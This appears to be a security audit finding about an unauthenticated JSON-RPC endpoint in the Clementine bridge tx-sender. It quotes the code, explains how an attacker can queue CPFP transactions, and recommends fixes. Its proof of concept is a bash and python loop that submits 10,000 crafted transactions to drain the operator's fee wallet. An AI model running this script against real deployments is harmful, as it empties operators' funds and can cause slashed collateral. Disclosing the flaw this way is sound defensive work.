### Title
Unauthenticated tx-sender JSON-RPC Allows Arbitrary Transaction Queue Injection and Fee-Wallet Drain — (`crates/clementine-tx-sender/src/jsonrpc/server.rs`)

---

### Summary

The standalone tx-sender JSON-RPC server exposes `send_tx` (and `send_citrea_tx`) over plain HTTP with no authentication, no rate limiting, and a 50 MB request body ceiling. Any network-reachable caller can enqueue arbitrary Bitcoin transactions with `FeePayingType::CPFP`, causing the tx-sender loop to create CPFP child transactions from the operator's fee wallet for every injected entry. This drains the fee wallet and floods the DB queue, preventing legitimate bridge transactions (kickoff, payout, challenge, reimbursement, disprove) from being fee-bumped and broadcast within their protocol timelocks.

---

### Finding Description

`start_jsonrpc_server` builds a `jsonrpsee` HTTP server with no middleware for authentication or rate limiting:

```rust
const MAX_JSONRPC_REQUEST_BODY_SIZE: u32 = 50 * 1024 * 1024;  // 50 MB

let server: Server = ServerBuilder::default()
    .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
    .build(bind_addr)   // no TLS, no auth layer
    .await ...;
``` [1](#0-0) 

The `send_tx` handler deserializes the caller-supplied `InsertTryToSendParams` and passes every field — including `fee_paying_type` — directly to `TxSenderClient::insert_try_to_send`:

```rust
module.register_async_method("send_tx", |params, client, _| async move {
    let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;
    // ...
    client.insert_try_to_send(
        &mut dbtx,
        req.tx_metadata,
        &signed_tx,
        req.fee_paying_type,   // ← attacker-controlled
        req.rbf_signing_info,
        &req.cancel_outpoints,
        &req.cancel_txids,
        &req.activate_txids,
        &req.activate_outpoints,
    ).await ...;
``` [2](#0-1) 

`InsertTryToSendParams` exposes `fee_paying_type` as a fully caller-controlled field: [3](#0-2) 

The configuration explicitly permits binding to `0.0.0.0`, making the server reachable from any network peer:

```rust
if bind != "127.0.0.1" && bind != "0.0.0.0" {
    return Err(...);
}
``` [4](#0-3) 

The gRPC servers, by contrast, enforce mTLS + certificate pinning + `RateLimitLayer` + `BufferLayer` before any handler logic runs: [5](#0-4) 

The JSON-RPC server has none of these layers.

---

### Impact Explanation

**Fee-wallet drain (primary):** The tx-sender loop calls `send_cpfp_tx` for every queued entry whose `fee_paying_type` is `CPFP`. An attacker who injects N entries with `FeePayingType::CPFP` forces the loop to create N CPFP child transactions spending from the operator's fee-payer UTXO set. Each child transaction consumes a fee-payer UTXO. Once the fee wallet is exhausted, the tx-sender can no longer fee-bump any transaction — including `Kickoff`, `Payout`, `Challenge`, `Reimburse`, `ReadyToReimburse`, and `Disprove`. [6](#0-5) 

**Liveness failure with collateral consequence:** If `Disprove` or `Challenge` transactions cannot be broadcast within their protocol timelocks because the fee wallet is empty, the operator's collateral bond is at risk of being slashed. `ReadyToReimburse` and `Reimburse` transactions that miss their windows result in permanent loss of reimbursement outputs. [7](#0-6) 

**DB queue flooding:** Each `insert_try_to_send` call writes rows to `tx_sender_try_to_send_txs`, `tx_sender_cancel_try_to_send_outpoints`, and `tx_sender_activated_txids`. Flooding these tables degrades query performance for the legitimate polling loop. [8](#0-7) 

---

### Likelihood Explanation

The server is a documented production deployment mode (`run.sh`, `main.rs`). The `TX_SENDER_JSONRPC_BIND=0.0.0.0` setting is explicitly validated and accepted. In any containerized or cloud deployment where the tx-sender port is reachable (e.g., within a shared VPC, or misconfigured firewall), any process can call `send_tx` with no credentials. The 50 MB body limit and absence of concurrency controls mean a single attacker connection can sustain a high injection rate. [9](#0-8) 

---

### Recommendation

1. **Add authentication before any handler logic.** The simplest option consistent with the existing architecture is to require a shared secret token in an HTTP header, checked in a tower middleware layer applied before `RpcModule` dispatch. Alternatively, restrict the server to Unix-domain sockets only (removing the `0.0.0.0` option).

2. **Add a rate-limiting middleware layer** (e.g., `tower::limit::RateLimitLayer`) to `ServerBuilder` before registering methods, mirroring the gRPC server setup.

3. **Validate `fee_paying_type` against a whitelist** of values acceptable for externally-submitted transactions, or strip it entirely and derive it server-side from the transaction structure.

4. **Cap the queue depth per caller** (or globally) to bound DB growth.

---

### Proof of Concept

```bash
# Attacker with network access to the tx-sender port (TX_SENDER_JSONRPC_BIND=0.0.0.0)
# Injects 10,000 CPFP-flagged transactions, each with a unique txid (different nonce in output).
# The tx-sender loop will attempt to CPFP-bump each one, draining the fee wallet.

for i in $(seq 1 10000); do
  # Craft a minimal syntactically-valid Bitcoin tx (different output value = different txid)
  RAW_TX_HEX=$(python3 -c "
import struct, hashlib
# version=2, 1 input (all-zeros outpoint, vout=$i), 1 output (0 sat, empty script), locktime=0
vin = b'\\x00'*32 + struct.pack('<I', $i) + b'\\x00' + b'\\xff\\xff\\xff\\xff'
vout = struct.pack('<q', 0) + b'\\x00'
raw = struct.pack('<I', 2) + b'\\x01' + vin + b'\\x01' + vout + struct.pack('<I', 0)
print(raw.hex())
")
  curl -s -X POST http://<TX_SENDER_HOST>:<PORT> \
    -H 'Content-Type: application/json' \
    -d "{\"jsonrpc\":\"2.0\",\"id\":$i,\"method\":\"send_tx\",\"params\":[{
      \"tx_metadata\":null,
      \"signed_tx_hex\":\"$RAW_TX_HEX\",
      \"fee_paying_type\":\"cpfp\",
      \"rbf_signing_info\":null,
      \"cancel_outpoints\":[],
      \"cancel_txids\":[],
      \"activate_txids\":[],
      \"activate_outpoints\":[]
    }]}" &
done
wait
# Result: 10,000 CPFP entries in DB; tx-sender loop exhausts fee wallet on child transactions;
# legitimate Kickoff/Payout/Challenge/Reimburse/Disprove transactions cannot be fee-bumped.
``` [10](#0-9)

### Citations

**File:** crates/clementine-tx-sender/src/jsonrpc/server.rs (L17-111)
```rust
const MAX_JSONRPC_REQUEST_BODY_SIZE: u32 = 50 * 1024 * 1024;

fn jsonrpc_err(message: impl ToString) -> ErrorObjectOwned {
    ErrorObjectOwned::owned(JSONRPC_INTERNAL_ERROR_CODE, message.to_string(), None::<()>)
}

#[derive(Debug, Clone)]
pub struct TxSenderJsonRpcServer {
    handle: ServerHandle,
    local_addr: SocketAddr,
}

impl TxSenderJsonRpcServer {
    pub fn local_addr(&self) -> SocketAddr {
        self.local_addr
    }

    pub fn stop(self) -> ServerHandle {
        self.handle
    }
}

/// Starts a JSON-RPC server exposing `send_tx` and `send_citrea_tx` methods.
/// `send_tx` and `send_citrea_tx` are transactional: it begins a DB transaction, calls
/// `TxSenderClient::insert_try_to_send` or `TxSenderClient::send_citrea_tx`, and commits on success.
pub async fn start_jsonrpc_server(
    tx_sender_client: TxSenderClient,
    bind_addr: SocketAddr,
) -> Result<TxSenderJsonRpcServer, BridgeError> {
    let server: Server = ServerBuilder::default()
        .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
        .build(bind_addr)
        .await
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let local_addr = server
        .local_addr()
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let mut module = RpcModule::new(tx_sender_client.clone());
    module
        .register_async_method("send_tx", |params, client, _| async move {
            let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;

            let raw_tx = hex::decode(&req.signed_tx_hex).map_err(jsonrpc_err)?;
            let signed_tx: Transaction = consensus::deserialize(&raw_tx).map_err(jsonrpc_err)?;

            let mut dbtx = client.db.begin_transaction().await.map_err(jsonrpc_err)?;

            let try_to_send_id = client
                .insert_try_to_send(
                    &mut dbtx,
                    req.tx_metadata,
                    &signed_tx,
                    req.fee_paying_type,
                    req.rbf_signing_info,
                    &req.cancel_outpoints,
                    &req.cancel_txids,
                    &req.activate_txids,
                    &req.activate_outpoints,
                )
                .await
                .map_err(jsonrpc_err)?;

            client
                .db
                .commit_transaction(dbtx)
                .await
                .map_err(jsonrpc_err)?;

            Ok::<u32, ErrorObjectOwned>(try_to_send_id)
        })
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    // Citrea-specific RPCs.
    #[cfg(feature = "citrea")]
    {
        module
            .register_async_method("send_citrea_tx", |params, client, _| async move {
                let req: InsertCitreaRawTxParams = params.one().map_err(jsonrpc_err)?;

                let insertion_id = client
                    .send_citrea_tx(req.citrea_tx_request)
                    .await
                    .map_err(jsonrpc_err)?;

                Ok::<i64, ErrorObjectOwned>(insertion_id)
            })
            .map_err(|e| BridgeError::Eyre(e.into()))?;
    }

    let handle = server.start(module);

    Ok(TxSenderJsonRpcServer { handle, local_addr })
}
```

**File:** crates/tx-sender-types/src/clementine.rs (L159-170)
```rust
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InsertTryToSendParams {
    pub tx_metadata: Option<TxMetadata>,
    /// Signed tx encoded as hex.
    pub signed_tx_hex: String,
    pub fee_paying_type: FeePayingType,
    pub rbf_signing_info: Option<RbfSigningInfo>,
    pub cancel_outpoints: Vec<OutPoint>,
    pub cancel_txids: Vec<Txid>,
    pub activate_txids: Vec<ActivatedWithTxid>,
    pub activate_outpoints: Vec<ActivatedWithOutpoint>,
}
```

**File:** crates/clementine-tx-sender/src/config.rs (L201-209)
```rust
                let bind = env_optional("TX_SENDER_JSONRPC_BIND")
                    .unwrap_or_else(|| "127.0.0.1".to_string());
                if bind != "127.0.0.1" && bind != "0.0.0.0" {
                    return Err(BridgeError::EnvVarMalformed(
                        "TX_SENDER_JSONRPC_BIND",
                        "bind must be either 127.0.0.1 or 0.0.0.0".to_string(),
                    ));
                }
                Ok(TxSenderJsonRpcConfig { bind, port })
```

**File:** core/src/servers.rs (L147-160)
```rust
            let server_builder = tonic::transport::Server::builder()
                .layer(AddMethodMiddlewareLayer)
                .layer(BufferLayer::new(config.grpc.req_concurrency_limit))
                .layer(RateLimitLayer::new(
                    config.grpc.ratelimit_req_count as u64,
                    Duration::from_secs(config.grpc.ratelimit_req_interval_secs),
                ))
                .timeout(Duration::from_secs(config.grpc.timeout_secs))
                .tcp_keepalive(Some(Duration::from_secs(config.grpc.tcp_keepalive_secs)))
                .concurrency_limit_per_connection(config.grpc.req_concurrency_limit)
                .http2_adaptive_window(Some(true))
                .tls_config(tls_config)
                .wrap_err("Failed to configure TLS")?
                .add_service(service);
```

**File:** core/src/tx_sender_queue.rs (L57-91)
```rust
        match tx_type {
            TransactionType::Kickoff
            | TransactionType::Dummy
            | TransactionType::ChallengeTimeout
            | TransactionType::DisproveTimeout
            | TransactionType::Reimburse
            | TransactionType::Round
            | TransactionType::OperatorChallengeNack(_)
            | TransactionType::UnspentKickoff(_)
            | TransactionType::MoveToVault
            | TransactionType::BurnUnusedKickoffConnectors
            | TransactionType::KickoffNotFinalized
            | TransactionType::MiniAssert(_)
            | TransactionType::LatestBlockhashTimeout
            | TransactionType::LatestBlockhash
            | TransactionType::EmergencyStop
            | TransactionType::OptimisticPayout
            | TransactionType::ReadyToReimburse
            | TransactionType::ReplacementDeposit
            | TransactionType::WatchtowerChallenge(_)
            | TransactionType::AssertTimeout(_) => {
                // no_dependency and cpfp
                self.insert_try_to_send(
                    dbtx,
                    tx_metadata,
                    signed_tx,
                    FeePayingType::CPFP,
                    rbf_info,
                    &[],
                    &[],
                    &[],
                    &[],
                )
                .await
            }
```

**File:** core/src/operator.rs (L1170-1189)
```rust
        // send ready to reimburse tx
        self.tx_sender
            .insert_try_to_send(
                dbtx,
                Some(TxMetadata {
                    tx_type: TransactionType::ReadyToReimburse,
                    operator_xonly_pk: Some(self.signer.xonly_public_key),
                    round_idx: Some(current_round_index),
                    kickoff_idx: None,
                    deposit_outpoint: None,
                }),
                ready_to_reimburse_tx,
                FeePayingType::CPFP,
                None,
                &[],
                &[],
                &[],
                &activation_prerequisites,
            )
            .await?;
```

**File:** crates/clementine-tx-sender/migrations/0001_init.up.sql (L14-30)
```sql
CREATE TABLE IF NOT EXISTS tx_sender_try_to_send_txs (
    id SERIAL PRIMARY KEY,
    raw_tx BYTEA NOT NULL,
    tx_metadata TEXT,
    fee_paying_type fee_paying_type NOT NULL,
    effective_fee_rate BIGINT,
    txid BYTEA,
    -- first observed chain height when tx was seen confirmed (used for finality tracking)
    seen_at_height INT,
    -- explicit finality flag: TRUE only when confirmations >= finality_depth from RPC
    is_finalized BOOLEAN NOT NULL DEFAULT FALSE,
    last_bump_block_height INT DEFAULT NULL,
    latest_active_at TIMESTAMP,
    created_at TIMESTAMP NOT NULL DEFAULT NOW(),
    rbf_signing_info TEXT,
    UNIQUE (txid)
);
```

**File:** crates/clementine-tx-sender/src/main.rs (L1-29)
```rust
#[cfg(feature = "json-rpc")]
#[tokio::main]
async fn main() -> Result<(), eyre::Report> {
    tracing_subscriber::fmt()
        .with_env_filter(tracing_subscriber::EnvFilter::from_default_env())
        .init();

    let config: clementine_tx_sender::config::TxSenderConfig =
        clementine_tx_sender::config::TxSenderConfig::from_env()?;

    if config.jsonrpc.is_none() {
        return Err(eyre::eyre!(
            "TX_SENDER_JSONRPC_PORT must be set to start the JSON-RPC server"
        ));
    }

    let db = clementine_tx_sender::TxSenderDb::connect(&config.postgres).await?;
    db.run_migrations().await?;
    db.pool().close().await;

    let handle = clementine_tx_sender::task::spawn_txsender_loop(config);

    // Wait until Ctrl-C, then abort the background loop.
    tokio::signal::ctrl_c().await?;
    tracing::info!("Received Ctrl-C, shutting down txsender");
    handle.abort();
    let _ = handle.await;
    Ok(())
}
```
